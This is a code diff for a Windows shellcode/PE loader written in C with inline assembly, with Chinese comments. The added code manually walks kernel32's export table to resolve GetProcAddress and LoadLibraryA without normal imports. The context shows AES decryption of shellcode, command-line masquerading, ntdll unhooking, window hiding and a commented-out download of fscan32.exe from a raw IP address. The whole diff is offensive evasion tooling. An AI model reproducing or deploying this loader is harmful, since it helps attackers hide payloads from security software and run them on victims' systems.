@@ -90,6 +90,79 @@ DWORD _getKernelBase()
     return dwDllBase1;
 }
 
+DWORD _getProcessAddress(DWORD address_base)
+{
+    //address_base = 0x76860000;
+    DWORD dwDllBase1;
+    __asm {
+
+        /* push ebp
+         mov ebp, esp
+         sub esp, 0x40*/
+         //xor ecx, ecx
+
+        mov ebx, [address_base]; EBX = Base address
+        mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
+        add edx, ebx; EDX = PE Header
+        mov edx, [edx + 0x78]; EDX = export table
+        add edx, ebx; EDX = Export table
+        mov esi, [edx + 0x20]; ESI = namestable
+        add esi, ebx; ESI = Names table
+        xor ecx, ecx; EXC = 0
+        Get_Function:
+        inc ecx; Increment the ordinal
+            lodsd; Get name
+            add eax, ebx; Get function name
+            cmp[eax], 50746547h; GetP
+            jnz Get_Function
+            cmp[eax + 0x04], 41636f72h; rocA
+            jnz Get_Function
+            cmp[eax + 0x08], 65726464h; ddre
+            jnz Get_Function
+            mov esi, [edx + 0x24]; ESI = ordinals
+            add esi, ebx; ESI = Ordinals table
+            mov cx, [esi + ecx * 2]; Number of function
+            dec ecx
+            mov esi, [edx + 0x1c];  address table
+            add esi, ebx; ESI = Address table
+            mov edx, [esi + ecx * 4]; EDX = Pointer()
+            add edx, ebx; EDX = GetProcAddress
+            mov eax, edx
+            mov DWORD PTR dwDllBase1, eax
+            /* add esp, 0x40
+             mov esp, ebp
+             pop ebp
+             ret*/
+
+    }
+    return dwDllBase1;
+
+}
+
+
+DWORD getFunction_LoadLibraryA(DWORD getproaddress, DWORD kernel32) {
+    DWORD dwDllBase1 = 0;
+    __asm {
+        /* push ebp
+       mov ebp, esp*/
+        mov eax, getproaddress
+        //mov dword ptr [ebp - 8], eax; GetProcAddress    //并把winexec字符串压栈后期调用getproaddress用以获取winexec地址
+        push 0x00
+        push 0x41797261 // Ayra
+        push 0x7262694c // rbiL
+        push 0x64616f4c // daoL
+        push esp
+        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
+        call getproaddress; [ebp - 8] ->GetProcAddress Addr
+        mov DWORD PTR dwDllBase1, eax
+        /*mov esp, ebp
+        pop ebp*/
+
+    }
+    return dwDllBase1;
+
+}
+
 // 进行aes解密
 void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
@@ -629,6 +702,10 @@ void PELoader(char* data, DWORD datasize)
     // 获取命令行参数
     masqueradeCmdline();
 
+    DWORD kernel32_address = _getKernelBase();
+    DWORD process_address = _getProcessAddress(kernel32_address);
+    typedef HMODULE(WINAPI* LoadLibraryAB)(LPCSTR lpLibFileName);
+    LoadLibraryAB LoadLibraryAa = (LoadLibraryAB)getFunction_LoadLibraryA(process_address, kernel32_address);
     unsigned int chksum = 0;
     for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; }; // 校验码
 
@@ -648,7 +725,7 @@ void PELoader(char* data, DWORD datasize)
     //printf("preferAddr: %p\n", preferAddr);
 
 
-    HMODULE dll = LoadLibraryA("ntdll.dll");
+    HMODULE dll = LoadLibraryAa("ntdll.dll");
     // 强制卸载
     //((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
     // 根据PE文件加载到内存占用的总大小申请内存
@@ -794,8 +871,8 @@ BOOL Unhook(LPVOID cleanNtdll) {
 
 int main(int argc, char** argv) {
     
-    HWND hwndDOS = GetForegroundWindow();
-    ShowWindow(hwndDOS, SW_HIDE);
+    //HWND hwndDOS = GetForegroundWindow();
+    //ShowWindow(hwndDOS, SW_HIDE);
     /*
     HttpRequest httpReq("101.42.175.89", 65522);
     std::vector<char> exeData = httpReq.HttpGet("/fscan32.exe");
